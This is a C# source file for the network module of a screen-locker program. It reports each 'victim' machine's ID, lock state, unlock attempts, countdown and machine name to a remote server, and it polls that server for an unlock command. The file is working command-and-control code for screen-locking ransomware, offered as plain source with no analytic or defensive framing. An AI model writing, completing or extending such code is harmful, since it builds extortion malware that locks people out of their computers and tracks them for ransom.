namespace ScreenLocker.Network;

using System.Net.Http.Json;
using ScreenLocker.Models;

public sealed class StatusReporter : IDisposable
{
    private readonly HttpClient _httpClient;
    private readonly string _serverUrl;
    private System.Threading.Timer? _reportTimer;

    public StatusReporter(string serverUrl)
    {
        _serverUrl = serverUrl.TrimEnd('/');
        _httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };
    }

    public void StartPeriodicReporting(LockState state, TimeSpan interval)
    {
        _reportTimer = new System.Threading.Timer(
            async _ => await ReportStatusAsync(state),
            null,
            TimeSpan.Zero,
            interval);
    }

    public void StopReporting()
    {
        _reportTimer?.Dispose();
        _reportTimer = null;
    }

    public async Task<bool> ReportStatusAsync(LockState state)
    {
        try
        {
            var payload = new
            {
                victimId = state.VictimId,
                isLocked = state.IsLocked,
                unlockAttempts = state.UnlockAttempts,
                remainingTime = state.RemainingTime.TotalSeconds,
                machineName = Environment.MachineName,
                timestamp = DateTime.UtcNow
            };

            var response = await _httpClient.PostAsJsonAsync($"{_serverUrl}/api/status", payload);
            return response.IsSuccessStatusCode;
        }
        catch
        {
            return false;
        }
    }

    public async Task<bool> CheckForUnlockCommandAsync(string victimId)
    {
        try
        {
            var response = await _httpClient.GetAsync($"{_serverUrl}/api/unlock/{victimId}");
            if (!response.IsSuccessStatusCode)
                return false;

            var result = await response.Content.ReadFromJsonAsync<UnlockResponse>();
            return result?.ShouldUnlock ?? false;
        }
        catch
        {
            return false;
        }
    }

    public void Dispose()
    {
        _reportTimer?.Dispose();
        _httpClient.Dispose();
    }

    private sealed class UnlockResponse
    {
        public bool ShouldUnlock { get; init; }
    }
}
